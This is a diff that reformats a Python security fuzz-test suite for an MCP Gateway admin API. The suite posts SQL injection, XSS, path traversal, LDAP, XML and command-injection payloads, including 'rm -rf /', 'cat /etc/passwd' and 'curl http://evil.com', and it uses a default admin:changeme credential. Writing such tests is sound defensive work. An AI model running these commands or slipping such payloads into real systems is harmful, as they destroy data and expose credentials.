@@ -6,6 +6,7 @@ Authors: Mihai Criveti
 
 Security-focused fuzz testing for MCP Gateway.
 """
+
 # Third-Party
 from fastapi.testclient import TestClient
 from hypothesis import given
@@ -27,114 +28,76 @@ class TestSecurityFuzzing:
         # Test SQL injection patterns in tool creation
         sql_patterns = [
             malicious_input,
-            f"'; DROP TABLE tools; --",
-            f"' OR '1'='1",
-            f"'; INSERT INTO tools (name) VALUES ('hacked'); --",
-            f"' UNION SELECT * FROM users --",
-            f"\"; DELETE FROM tools WHERE '1'='1'; --",
+            "'; DROP TABLE tools; --",
+            "' OR '1'='1",
+            "'; INSERT INTO tools (name) VALUES ('hacked'); --",
+            "' UNION SELECT * FROM users --",
+            "\"; DELETE FROM tools WHERE '1'='1'; --",
         ]
 
         for pattern in sql_patterns:
             # Test in tool name field
-            payload = {
-                "name": pattern,
-                "url": "http://example.com",
-                "description": "test"
-            }
+            payload = {"name": pattern, "url": "http://example.com", "description": "test"}
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             # Should not crash, may reject invalid input
             assert response.status_code in [200, 201, 400, 401, 422]
 
             # Test in description field
-            payload = {
-                "name": "test-tool",
-                "url": "http://example.com",
-                "description": pattern
-            }
+            payload = {"name": "test-tool", "url": "http://example.com", "description": pattern}
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             assert response.status_code in [200, 201, 400, 401, 422]
 
-    @given(st.text().filter(lambda x: any(char in x for char in '<>"\'&')))
+    @given(st.text().filter(lambda x: any(char in x for char in "<>\"'&")))
     def test_xss_prevention(self, potentially_malicious):
         """Test XSS prevention in user inputs."""
         client = TestClient(app)
 
         xss_patterns = [
             potentially_malicious,
-            f"<script>alert('xss')</script>",
-            f"javascript:alert('xss')",
-            f"<img src=x onerror=alert('xss')>",
-            f"</script><script>alert('xss')</script>",
-            f"' onmouseover='alert(\"xss\")'",
-            f"\"><script>alert('xss')</script>",
+            "<script>alert('xss')</script>",
+            "javascript:alert('xss')",
+            "<img src=x onerror=alert('xss')>",
+            "</script><script>alert('xss')</script>",
+            "' onmouseover='alert(\"xss\")'",
+            "\"><script>alert('xss')</script>",
         ]
 
         for pattern in xss_patterns:
             # Test in description field that might be rendered
-            payload = {
-                "name": "test-tool",
-                "url": "http://example.com",
-                "description": pattern
-            }
+            payload = {"name": "test-tool", "url": "http://example.com", "description": pattern}
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             # Should handle potentially malicious content safely
             assert response.status_code in [200, 201, 400, 401, 422]
 
             if response.status_code in [200, 201]:
                 # If accepted, verify no raw script tags in admin interface
-                admin_response = client.get(
-                    "/admin",
-                    headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-                )
+                admin_response = client.get("/admin", headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
                 # Raw script tags should not appear unescaped
                 if "<script>" in pattern.lower():
                     assert "<script>" not in admin_response.text.lower()
 
-    @given(st.integers(min_value=-2**31, max_value=2**31))
+    @given(st.integers(min_value=-(2**31), max_value=2**31))
     def test_integer_overflow_handling(self, large_int):
         """Test handling of integer overflow in numeric fields."""
         client = TestClient(app)
 
         # Test in ID fields and numeric parameters
-        response = client.get(
-            f"/admin/tools/{large_int}",
-            headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-        )
+        response = client.get(f"/admin/tools/{large_int}", headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
         # Should handle large integers gracefully
         assert response.status_code in [200, 400, 401, 404, 422]
 
         # Test in port numbers and other numeric fields
-        payload = {
-            "name": "test-tool",
-            "url": f"http://example.com:{large_int}",
-            "description": "test"
-        }
+        payload = {"name": "test-tool", "url": f"http://example.com:{large_int}", "description": "test"}
 
-        response = client.post(
-            "/admin/tools",
-            json=payload,
-            headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-        )
+        response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
         assert response.status_code in [200, 201, 400, 422]
 
@@ -153,33 +116,17 @@ class TestSecurityFuzzing:
 
         for pattern in path_traversal_patterns:
             # Test in URL fields
-            payload = {
-                "name": "test-tool",
-                "url": f"file://{pattern}",
-                "description": "test"
-            }
+            payload = {"name": "test-tool", "url": f"file://{pattern}", "description": "test"}
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             # Should reject or sanitize path traversal attempts
             assert response.status_code in [200, 201, 400, 401, 422]
 
             # Test in other string fields
-            payload = {
-                "name": pattern,
-                "url": "http://example.com",
-                "description": pattern
-            }
+            payload = {"name": pattern, "url": "http://example.com", "description": pattern}
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             assert response.status_code in [200, 201, 400, 401, 422]
 
@@ -190,13 +137,13 @@ class TestSecurityFuzzing:
 
         command_injection_patterns = [
             input_text,
-            f"; rm -rf /",
-            f"| cat /etc/passwd",
-            f"$(whoami)",
-            f"`id`",
-            f"& ping google.com",
-            f"|| curl http://evil.com",
-            f"'; system('rm -rf /'); '",
+            "; rm -rf /",
+            "| cat /etc/passwd",
+            "$(whoami)",
+            "`id`",
+            "& ping google.com",
+            "|| curl http://evil.com",
+            "'; system('rm -rf /'); '",
         ]
 
         for pattern in command_injection_patterns:
@@ -204,14 +151,10 @@ class TestSecurityFuzzing:
                 "name": "test-tool",
                 "url": "http://example.com",
                 "description": pattern,
-                "jsonpath_filter": pattern  # Test in JSONPath filter which might be processed
+                "jsonpath_filter": pattern,  # Test in JSONPath filter which might be processed
             }
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             # Should not execute commands or crash
             assert response.status_code in [200, 201, 400, 401, 422]
@@ -230,20 +173,9 @@ class TestSecurityFuzzing:
 
         for pattern in header_injection_patterns:
             # Test in custom headers
-            payload = {
-                "name": "test-tool",
-                "url": "http://example.com",
-                "headers": {
-                    "Custom-Header": pattern,
-                    "Another-Header": pattern
-                }
-            }
+            payload = {"name": "test-tool", "url": "http://example.com", "headers": {"Custom-Header": pattern, "Another-Header": pattern}}
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             # Should sanitize or reject header injection attempts
             assert response.status_code in [200, 201, 400, 401, 422]
@@ -263,21 +195,9 @@ class TestSecurityFuzzing:
 
         for pattern in ldap_patterns:
             # Test in authentication fields if they exist
-            payload = {
-                "name": "test-tool",
-                "url": "http://example.com",
-                "auth": {
-                    "auth_type": "basic",
-                    "username": pattern,
-                    "password": pattern
-                }
-            }
+            payload = {"name": "test-tool", "url": "http://example.com", "auth": {"auth_type": "basic", "username": pattern, "password": pattern}}
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             assert response.status_code in [200, 201, 400, 401, 422]
 
@@ -293,17 +213,9 @@ class TestSecurityFuzzing:
         ]
 
         for pattern in xml_patterns:
-            payload = {
-                "name": "test-tool",
-                "url": "http://example.com",
-                "description": pattern
-            }
+            payload = {"name": "test-tool", "url": "http://example.com", "description": pattern}
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             # Should handle XML content safely
             assert response.status_code in [200, 201, 400, 401, 422]
@@ -315,19 +227,15 @@ class TestSecurityFuzzing:
 
         try:
             # Try to decode as various encodings
-            text_data = binary_data.decode('utf-8', errors='ignore')
+            text_data = binary_data.decode("utf-8", errors="ignore")
 
             payload = {
                 "name": text_data[:50],  # Limit length
                 "url": "http://example.com",
-                "description": text_data[:500]
+                "description": text_data[:500],
             }
 
-            response = client.post(
-                "/admin/tools",
-                json=payload,
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json=payload, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
 
             # Should handle binary/non-UTF8 data gracefully
             assert response.status_code in [200, 201, 400, 401, 422]
@@ -368,19 +276,14 @@ class TestSecurityFuzzing:
         # Create increasingly large payloads
         large_string = "x" * (size_multiplier * 100)
 
-        payload = {
-            "name": f"tool_{size_multiplier}",
-            "url": "http://example.com",
-            "description": large_string,
-            "tags": [f"tag_{i}" for i in range(min(size_multiplier, 100))]
-        }
+        payload = {"name": f"tool_{size_multiplier}", "url": "http://example.com", "description": large_string, "tags": [f"tag_{i}" for i in range(min(size_multiplier, 100))]}
 
         try:
             response = client.post(
                 "/admin/tools",
                 json=payload,
                 headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="},
-                timeout=10  # Prevent hanging
+                timeout=10,  # Prevent hanging
             )
 
             # Should handle large requests gracefully (may reject)
@@ -403,14 +306,7 @@ class TestSecurityFuzzing:
         ]
 
         for origin in malicious_origins:
-            response = client.options(
-                "/admin/tools",
-                headers={
-                    "Origin": origin,
-                    "Access-Control-Request-Method": "POST",
-                    "Access-Control-Request-Headers": "Authorization"
-                }
-            )
+            response = client.options("/admin/tools", headers={"Origin": origin, "Access-Control-Request-Method": "POST", "Access-Control-Request-Headers": "Authorization"})
 
             # Should not allow arbitrary origins
             cors_header = response.headers.get("Access-Control-Allow-Origin", "")
@@ -428,14 +324,7 @@ class TestSecurityFuzzing:
         # Make many rapid requests
         responses = []
         for i in range(20):
-            response = client.post(
-                "/admin/tools",
-                json={
-                    "name": f"rapid_tool_{i}",
-                    "url": "http://example.com"
-                },
-                headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="}
-            )
+            response = client.post("/admin/tools", json={"name": f"rapid_tool_{i}", "url": "http://example.com"}, headers={"Authorization": "Basic YWRtaW46Y2hhbmdlbWU="})
             responses.append(response.status_code)
 
         # Should either accept all or start rate limiting
